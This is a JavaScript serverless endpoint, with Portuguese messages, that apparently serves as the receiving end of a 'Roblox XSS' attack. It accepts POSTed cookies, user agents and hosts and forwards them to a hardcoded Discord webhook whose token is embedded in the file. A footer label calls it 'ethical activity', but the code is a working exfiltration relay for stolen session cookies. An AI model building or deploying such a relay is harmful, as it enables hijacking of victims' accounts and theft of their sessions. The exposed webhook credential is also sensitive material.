export const config = {
  runtime: "edge",
};

const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";

export default async function handler(req) {
  if (req.method !== "POST") {
    return new Response("Método não permitido", { status: 405 });
  }

  try {
    const body = await req.json();
    const data = body.data || [];

    if (!Array.isArray(data) || data.length === 0) {
      return new Response("Nenhum dado para enviar", { status: 400 });
    }

    // Construir campos do embed com os dados recebidos
    const fields = data.map((item, i) => ({
      name: `Dado ${i + 1}`,
      value: [
        `Cookie: \`${item.cookie || "Não enviado"}\``,
        `User Agent: \`${item.userAgent || "Não enviado"}\``,
        `Host: \`${item.host || "Não enviado"}\``,
      ].join("\n"),
      inline: false,
    }));

    const payload = {
      embeds: [
        {
          title: "Dados Recebidos - Roblox XSS",
          color: 0xff0000,
          fields,
          timestamp: new Date().toISOString(),
          footer: { text: "Atividade Ética - Envio via API" },
        },
      ],
    };

    const response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      return new Response("Erro ao enviar webhook", { status: 500 });
    }

    return new Response("Enviado com sucesso!", { status: 200 });
  } catch (err) {
    return new Response("Erro no servidor: " + err.message, { status: 500 });
  }
}
